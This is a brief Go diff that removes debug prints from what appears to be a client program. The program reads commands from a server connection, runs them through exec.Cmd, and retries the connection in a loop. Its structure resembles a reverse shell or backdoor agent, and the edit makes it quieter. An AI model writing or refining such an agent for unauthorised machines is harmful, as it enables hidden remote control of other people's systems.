@@ -20,8 +20,6 @@ func receiveFromServer(conn net.Conn) {
 
 		command := strings.Fields(message)
 
-		fmt.Println(command)
-
 		var cmd *exec.Cmd
 
 		if len(command) == 1 {
@@ -48,7 +46,6 @@ func main() {
 		if err == nil {
 			break
 		}
-		fmt.Println("cant connect to srv")
 		time.Sleep(time.Second * 1)
 	}
 
